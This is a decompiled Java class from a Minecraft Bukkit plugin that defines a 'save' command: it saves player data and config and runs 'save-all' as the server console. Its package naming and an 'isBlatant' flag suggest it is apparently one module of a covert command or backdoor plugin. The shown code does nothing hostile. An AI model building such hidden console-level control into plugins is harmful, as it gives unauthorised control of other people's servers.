/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.command.CommandSender
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class SaveCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        plugin.getServer().getScheduler().runTaskAsynchronously((Plugin)plugin, () -> {
            Bukkit.getServer().savePlayers();
            API.saveConfig();
        });
        Bukkit.getServer().dispatchCommand((CommandSender)Bukkit.getServer().getConsoleSender(), "save-all");
        p2.sendMessage(Settings.PREFIX("Everything is now saved."));
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

